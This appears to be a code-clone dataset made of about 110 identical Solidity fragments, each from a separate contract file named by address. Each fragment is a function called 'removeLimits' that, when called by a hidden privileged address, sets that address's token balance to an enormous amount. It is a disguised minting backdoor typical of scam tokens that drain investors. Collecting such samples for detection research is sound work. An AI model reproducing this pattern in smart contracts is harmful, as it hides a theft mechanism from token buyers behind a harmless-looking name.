<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="42" endline="46" pcid="8253">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="43" endline="47" pcid="60">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="45" endline="49" pcid="4926">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="41" endline="45" pcid="7645">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="47" endline="51" pcid="3112">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x508D2342902B5D12154dCC7485c1a80242D7AEA9.sol" startline="45" endline="49" pcid="2970">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="44" endline="48" pcid="5777">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="46" endline="50" pcid="2652">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="49" endline="53" pcid="2519">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="41" endline="45" pcid="6129">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="47" endline="51" pcid="5056">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="41" endline="45" pcid="7198">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="39" endline="43" pcid="4996">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="43" endline="47" pcid="5041">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="45" endline="49" pcid="813">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="45" endline="49" pcid="7585">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="45" endline="49" pcid="4941">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="44" endline="48" pcid="7183">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="661" endline="665" pcid="2208">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="41" endline="45" pcid="8238">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="44" endline="48" pcid="7031">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="39" endline="43" pcid="3267">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="41" endline="45" pcid="9186">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="41" endline="45" pcid="5758">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="39" endline="43" pcid="5026">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="44" endline="48" pcid="8526">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="45" endline="49" pcid="3591">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="45" endline="49" pcid="3753">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="369" endline="373" pcid="5276">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="45" endline="49" pcid="4654">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="45" endline="49" pcid="8298">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="41" endline="45" pcid="5743">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="41" endline="45" pcid="920">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="46" endline="50" pcid="2242">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="44" endline="48" pcid="2955">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="45" endline="49" pcid="1908">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="47" endline="51" pcid="75">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="43" endline="47" pcid="6243">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="42" endline="46" pcid="1605">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="44" endline="48" pcid="4962">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="47" endline="51" pcid="2193">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="44" endline="48" pcid="5462">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="40" endline="44" pcid="3783">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="45" endline="49" pcid="4219">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="44" endline="48" pcid="5261">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="47" endline="51" pcid="8283">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="43" endline="47" pcid="3000">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="47" endline="51" pcid="3614">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="44" endline="48" pcid="8875">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="41" endline="45" pcid="3878">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="43" endline="47" pcid="8418">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xE29128019902c7B59CEb2A145D7FBFdA58b0ab02.sol" startline="48" endline="52" pcid="8162">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="46" endline="50" pcid="3995">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2965DC16e5d7525240AFDac5315214170C1dBe26.sol" startline="42" endline="46" pcid="1253">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="45" endline="49" pcid="1840">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="46" endline="50" pcid="1503">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="41" endline="45" pcid="5382">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="45" endline="49" pcid="457">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="48" endline="52" pcid="8731">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="38" endline="42" pcid="7046">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="40" endline="44" pcid="3338">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="38" endline="42" pcid="3523">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="45" endline="49" pcid="1676">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="41" endline="45" pcid="2816">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="42" endline="46" pcid="8578">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="45" endline="49" pcid="8746">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="40" endline="44" pcid="2682">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="48" endline="52" pcid="557">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="45" endline="49" pcid="8433">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="42" endline="46" pcid="2667">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="41" endline="45" pcid="354">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="41" endline="45" pcid="8448">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="39" endline="43" pcid="1893">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="41" endline="45" pcid="5492">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="45" endline="49" pcid="7534">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="44" endline="48" pcid="688">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="47" endline="51" pcid="4585">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="46" endline="50" pcid="8403">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="47" endline="51" pcid="1859">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="41" endline="45" pcid="2104">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="44" endline="48" pcid="4600">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="46" endline="50" pcid="8716">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="42" endline="46" pcid="4685">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="43" endline="47" pcid="6420">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="42" endline="46" pcid="5165">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="42" endline="46" pcid="1155">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="46" endline="50" pcid="4264">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="46" endline="50" pcid="6495">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="41" endline="45" pcid="2985">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="45" endline="49" pcid="6223">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="43" endline="47" pcid="3543">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="105" endline="109" pcid="3508">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="45" endline="49" pcid="5442">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="42" endline="46" pcid="4311">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="42" endline="46" pcid="9271">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="47" endline="51" pcid="8463">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="45" endline="49" pcid="1995">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="45" endline="49" pcid="1105">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="41" endline="45" pcid="1140">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="43" endline="47" pcid="2795">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="41" endline="45" pcid="6575">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="40" endline="44" pcid="6510">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="42" endline="46" pcid="2353">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="44" endline="48" pcid="9325">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
